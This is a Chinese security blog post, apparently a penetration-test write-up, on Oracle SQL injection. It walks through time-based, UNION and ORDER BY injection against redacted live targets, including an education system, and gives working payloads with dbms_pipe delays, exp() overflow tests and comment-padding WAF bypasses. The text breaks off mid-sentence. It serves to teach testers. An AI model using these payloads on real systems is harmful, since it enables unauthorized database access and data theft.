---
title: 【Web实战】Oracle注入专题——注入注意点+排序注入绕过实战之踩坑篇
url: https://mp.weixin.qq.com/s/8jxEYQk-7nP_C7uBfbLioA
source: Doonsec's feed
date: 2026-07-19
fetch_date: 2026-07-20T05:31:52.051671
---

# 【Web实战】Oracle注入专题——注入注意点+排序注入绕过实战之踩坑篇

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Pled5HYvsFEDI8fiaxdLymNPf7P2EANxGJ0yfuvTkAvelbUlWJheyvnZXs70gVhWsKSaltJIkU9OibqwlkiaC5F6iaqJu3r00PryIlzic2DUMctI/0?wx_fmt=jpeg)

# 【Web实战】Oracle注入专题——注入注意点+排序注入绕过实战之踩坑篇

带头大哥
带头大哥

只会看监控的实习生

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 前言

今天这篇SQL注入的专题给到我们的Oracle数据库，它是甲骨文公司的一款关系数据库管理系统，其中在市面上的使用率也是很高的。因此这里有必要学习一下关于它的SQL注入的一些注意事项。我会在本篇文章中提到Oracle注入的注意点和其中的排序注入与绕过。

# Oracle注入注意点

Oracle数据库在注入过程中的特别之处在于它对于字段点数据类型敏感，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以。因此它在注入的过程中便需要注意判断数据字段的类型。这里我会列出案例来让大家更好的了解。

## 案例

https://xxx

其中点击公告信息，抓包：

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHbZJVreaoKofxUXJuaSDjJ7qsdNOREma43kMSibM5ZztpOibJ7JrLXw3036NGlgC3yDscW3Cu3tQ2MnP7iaT6v0Hcm4MWxSAINpE/640?wx_fmt=png&from=appmsg)

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFGpMleeq58QuSS4oOf7TwH1ZibIiaVa8VayJvN37mSHGibmHsic3ibjYHeCNWldg9OJK9LxvVEr6ViaibHhGQa1GJRL5jWdj5fBceE6W0/640?wx_fmt=png&from=appmsg)

其中的noteID参数存在单引号字符型注入，这里因为是纯回显的，所以就能直接判断出为oracle数据库

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHaA3OB4L76ET3as2oUStkreuN3yfUibDOsX7FNZPkakuHIbK7cXvM5qBg0aMc9fesvvMqCgXZnib8UVhRniapfJDibwf1B2ADicemk/640?wx_fmt=png&from=appmsg)

其中payload：

6340d33754bf402798a6051733698a3c'+and+1=dbms\_pipe.receive\_message('RDS',5)--，成功延时5秒：

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFHGyPTcicry7EGzWkEcooPDeKzVEtibN3qpsoc3FbDbBVxxxSMtJbD4J8ypczvlHVo1lGU0RwjcNNtG5hVjiaYptNjnkcUhsvmwGM/640?wx_fmt=png&from=appmsg)

2，则延时2秒：

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHKwxXbrVL6g3X4fYHHKJnwGCKf1pmkva8Qh7yCHhibiall8B0CR2eKylib3sXB1TqXulnmuMhKtrQYMcjrXomWJ4qxXUIjR0Sj5U/640?wx_fmt=png&from=appmsg)

其中还可以order by判断出列数为2：

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFEZoMAHds4yiatd9TPqlW7XzJwl9WX1njXlBIL19cxnFHFcUKicJhic1mAFZdwkRicxLVPmfZ3e5srDo49DyctfnA7xcoz56FaBf7Q/640?wx_fmt=png&from=appmsg)

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFEA0E2rvfTia5B2lnjWSxbzicLVCIoknLlVX8siaMTMZk9WWfon7ow9rZ7WHwpUgA3E0AhGe3wanJdBR6IW6HMxMaCWrPicJRsp1ZU/640?wx_fmt=png&from=appmsg)

而oracle数据库与mysql数据库不同点在于它对于字段点数据类型敏感，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以：比如如果这里是在在MySQL数据库中，那么这里只需要`union+select+1,2`就可以了；

但是这里是oracle数据库，那么这里就有些许不同了：首先6340d33754bf402798a6051733698a3c'+union+select+1,2+from+dual--

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGMibpHw83UwqYBjblwJmRS6U9T92xqTQ8029qkbAhfuzibc2wnicvqLE1g6aN9Yefz4rEWbiaSkjloKC81HcPOgV2WFJecNRpO80E/640?wx_fmt=png&from=appmsg)

这里的报错就直接提示了需要使用相同的数据类型，因此这里的字段类型为字符型。那么这里就需要将整型改变成字符型： 6340d33754bf402798a6051733698a3c'+union+select+'1','2'+from+dual--

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFFOR91ORv0YwvOvJSXPzOyEc8ShEEux6kKIRkhOicdK1pxNFMbtHJv0jPjVSiar29qKWNLFjcvA4BoKb4SsNj0BGjkYMXgiahIIrA/640?wx_fmt=png&from=appmsg)

那么这里说明两个字段都为字符型。

然后用select+banner+from+sys.v\_$version+where+rownum=1查询数据库版本信息：

6340d33754bf402798a6051733698a3c'+union+select+'1',(select+banner+from+sys.v\_$version+where+rownum=1)+from+dual--

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHVm7SWDLficaWIQxZhg9el2hRmUCK7MlSkRBeArfIcWqIiajmOdRwqPvMNuZIN28mfJnLGrR0KesY97XlGqgWpNDZeJmKKpKGpI/640?wx_fmt=png&from=appmsg)

select instance\_name from V$INSTANCE查询当前数据库

6340d33754bf402798a6051733698a3c'+union+select+'1',(select+instance\_name+from+V$INSTANCE)+from+dual--

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFElwzvSqiaibqkSibxhnpFIFo13vIqfAfR1zjDHhILFZ0WmPa1yXp7n8lYrznvzFEghiaE4lmUtMdKaTQHuPZNCnCcsqZwfoEKfibns/640?wx_fmt=png&from=appmsg)

获取数据库第一个表名：

select+table\_name+from+user\_tables+where+rownum=1

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGiaSq1Xbk43y8UUPgNBjSsFYZ8JETFEFPZbqQVAmsPOUIic7tEv6sCpFewKQ3Mh3Buer35SsGYicoITevSTKc2ia5FvU4hGGrJUO0/640?wx_fmt=png&from=appmsg)

# 排序注入

在很多web站点中，都提供了对前端界面显示数据的排序功能，而实际中web站点的排序功能基本都是借助SQL语言的`order by`来实现的，其中的`asc`为升序排列；`desc`为降序排列。那么其中大概的SQL语句为`SELECT * FROM users ORDER BY 1 desc/asc;`这样。而存在**排序注入**的话，其中可控的便是`desc`/`asc`这个位置。

其中可以用报错盲注：`desc,updatexml(1,concat(0x7e,(database()),0x7e),1)`

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFF2lWVEB81Y73WSvJPArnPo5ZmD10AhxdEXUiahxLKKcr4ggFBZEKNfBj4z5YEMNoW5krXuIe67otTbNLKsjN7zgo1Kys12ZgBQ/640?wx_fmt=png&from=appmsg)

也可以用延时盲注：`desc,sleep(5)`

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFFeibEibwicGJibGI1Cclfax8VZrAmzBx4h9phOls7BMkGm0v3siaDrTKG0Lt1arb9dHTwFxfHnpjTRWsaicDaShL7tHWHWzCdBzsvA4/640?wx_fmt=png&from=appmsg)

以下我将采用案例来更好的让大家学习在Oracle数据库中的排序注入，以及我踩到的坑和如何爬出来的。

## 案例

https://x.x.x.x/，用户名xxx 密码xxx

其中点击新教务系统：

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFH5cwOiaiabOJaWwZK481JaXF7fZ9DJ7jqcKOD9lQevNexbu0HShTotW6LaibyB6otDN25VOI1aCiaZMzl9kjjxfLbiaibLxsr7VAmC8/640?wx_fmt=png&from=appmsg)

然后抓包：

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFEbDlZH1RDGhT7ibMVvc2iaSL7hE4oDo73lB3r1HpFesYrFJ3yPyGMSyEStDoQZ4cNzmURTIeco0JMX2K1XrNiaGRGUTnbgpdLuTk/640?wx_fmt=png&from=appmsg)

其中的`sSortDir_0`参数发现存在关键字`asc`。那么这里进行一个合理的猜测，这个含有`asc`的参数会被拼接到sql语句中执行。进行完猜测后，这里便开始实践来验证我的猜想。

### 第一步：判断是否存在sql注入

其中这里我使用判断普通sql注入的方式`'`、`"`、`/0`和`/1`来进行判断，初步判断出我的猜测是正确的，确实可能存在注入。（这里图没存，就不贴图了）

### 第二步：判断数据库类型

这里判断出`#`不能注释：

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFEBAU9mUgCvkUHc2eVNNbPAVpXSrPsOYXQJpfYYOeTNFGNHLkibCt0cwYEENybm65PC0PYOVP2cIXzIt8v75IxE6FuAHRv23d8A/640?wx_fmt=png&from=appmsg)

而`--`可以注释：

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFG4fEcyu3OCQicwLm6iaAtKM17NXRWiagwtElc0Nz3VRN94Oq86ibvSe0ORnruEgWfBSCthJnyjAFxXVxKk76pXUrPoC50CI3YGoG4/640?wx_fmt=png&from=appmsg)

而在mysql里`#`和`--`都可以注释，然后这里还是java站点，那么这里判断为Oracle数据库。

### 第三步：正式开始注入

那么这里便开始进行初步的排序注入：这里首先使用的是`exp()函数`来进行判断，其中数值大于709就会溢出，从而报错。果不其然，`asc,exp(710)`成功报错：

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFGe9p80RNzb7k2aTV1icbheyKhFQZAOuMeiaoibialLMyQf3w4ZULBLpI1XibiaygWUOK5Jzv5iaWcPA4Fia8BBBkNVpTnBDWEfAH6ThOk/640?wx_fmt=png&from=appmsg)

而`asc,exp(1)`返回成功：

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFEXlPXBiaENEwkw3herHINgdWVgs4U0Uqnn7mT7ohSa1ddT3QUDH3Lwnia5Yq6AY9T4OrSSfqnzZAIYIFsOia5osClpehLdSHgwibs/640?wx_fmt=png&from=appmsg)然后这里带上延时语句：

`asc,DBMS_PIPE.RECEIVE_MESSAGE('RDS',1)`

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGNfOjpMhSARkuJdrfukpN2xR8ENxVzoVkws2A1IJ0fjnicEjvZfc16fAzIDwshn6BG91bGmnT4jkXAcst6wj7xxuuLpukTO9Vo/640?wx_fmt=png&from=appmsg)

`asc,DBMS_PIPE.RECEIVE_MESSAGE('RDS',2)`

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFHcs3IeT15R2lCzUzLYHCgvrGXgU8FXI4YpmWEdBVtBLI3lPvt3fia1HNzLR292AhRILQn0N57FIGibP19KBPyiaicJXXd1n29CxXc/640?wx_fmt=png&from=appmsg)

这里可以成功延时。

### 遇到的坑

最后这里来讲讲踩到的坑吧：

这里一开始以为是MySQL数据库，又有依讯waf会拦截，然后就一直是用注MySQL的思维来绕过：

像这里依讯waf会把`sleep(1)`这样直接拦截：

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFE5MxEcz55mAs1XAvMricEoicDHuhmtdia3dtXD9Rvxfhv2Kzhr3ZrJAUiaXpbA3rvul2QsEVicq3Oq1qib7h7ZzjicXCflhOvhd667kE/640?wx_fmt=png&from=appmsg)

不过在MySQL里这样多行注释加垃圾字符插在`sleep(1)`之间也是可以成功执行的，但是在Oracle里极其严格这样都是无法成功的：

`sleep/*666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/(1)`

这里附上图片：MySQL数据库里这样多行注释加垃圾字符插在`sleep(1)`之间也是可以成功延时的

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFEdiaBtQhCc53oXEeYGPEVYb9kxNTvvEhVAfVX4P7U4P3dLzmnSNL64fuFWE9iakfo7JRHrnwQFj9ibOXAFNib72DEicPmsMu96DictE/640?wx_fmt=png&from=appmsg)

这里能这么绕过，但是并没有延时。说明不是MySQL：

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFErtiaZqtGYoELibVWBrjSlLjhMvodmPIL9TRPwkFCzic6CvNV47PvT7KT0Gyg5jAm9a1kBk7eBvGG7t1RepqrialLmKxia2jGHewAQ/640?wx_fmt=png&from=appmsg)

然后是updatexml报错注入：

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHuyibPCH7Bz2p7W6ax1rYCKTxtjXAoZDfibA2mhxS2ICciagrnBtLoS50a67nuKZtdJZt2LboVtnxuUUWO7pqMdFjlvNcEAwZQSk/640?wx_fmt=png&from=appmsg)

这里也能...